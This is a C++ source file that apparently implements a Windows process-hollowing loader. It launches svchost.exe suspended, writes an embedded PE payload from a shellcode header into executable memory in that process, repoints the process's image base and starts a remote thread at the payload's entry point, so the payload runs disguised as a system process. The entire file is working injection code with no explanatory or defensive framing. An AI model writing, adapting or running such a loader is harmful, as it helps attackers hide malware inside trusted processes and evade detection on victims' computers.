#include <iostream>
#include <Windows.h>
#include <strsafe.h>

#include "hdr/shellcode.h"

int main() {
	PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)rawData;
	PIMAGE_NT_HEADERS NtHeader = (PIMAGE_NT_HEADERS)(rawData + DosHeader->e_lfanew);

	PPROCESS_INFORMATION pi = (PPROCESS_INFORMATION)malloc(sizeof(PROCESS_INFORMATION));
	STARTUPINFO si = { sizeof(si) };

	ULONG retlen;
	PROCESS_BASIC_INFORMATION pbi;
	void* newImgBase;
	DWORD ImgBaseAddress;

	HMODULE ntDll = LoadLibraryA("ntdll.dll");
	NTQUERYINFOPROC NtQueryInformationProcess = (NTQUERYINFOPROC)GetProcAddress(ntDll, "NtQueryInformationProcess");

	if (NtHeader->Signature != IMAGE_NT_SIGNATURE) {
		return 1;
	}

	CreateProcess("C:\\Windows\\System32\\svchost.exe",
		NULL, NULL, NULL, FALSE,
		CREATE_SUSPENDED, // le flag
		NULL, NULL, &si, pi);

	NtQueryInformationProcess(
		pi->hProcess,
		ProcessBasicInformation,
		&pbi,
		sizeof(PROCESS_BASIC_INFORMATION),
		&retlen
	);

	newImgBase = VirtualAllocEx(
		pi->hProcess,
		NULL,
		NtHeader->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	WriteProcessMemory(pi->hProcess, newImgBase, rawData, NtHeader->OptionalHeader.SizeOfHeaders, 0);

	PIMAGE_SECTION_HEADER SectionHeader = PIMAGE_SECTION_HEADER(DWORD(rawData) + DosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));

	for (int num = 0; num < NtHeader->FileHeader.NumberOfSections; num++)
	{
		WriteProcessMemory(pi->hProcess,
			(LPVOID)(DWORD(newImgBase) + SectionHeader->VirtualAddress),
			LPVOID(DWORD(rawData) + SectionHeader->PointerToRawData),
			SectionHeader->SizeOfRawData,
			0);
		SectionHeader++;
	}

	ImgBaseAddress = (DWORD)pbi.PebBaseAddress + 0x08;
	WriteProcessMemory(pi->hProcess, (LPVOID)ImgBaseAddress, LPVOID(&newImgBase), 4, 0);

	HANDLE NewThread = CreateRemoteThread(pi->hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)((DWORD)(newImgBase)+NtHeader->OptionalHeader.AddressOfEntryPoint),
		NULL,
		CREATE_SUSPENDED,
		NULL);

	ResumeThread(NewThread);

	SuspendThread(pi->hThread);

	FreeLibrary(ntDll);
	return 0;
}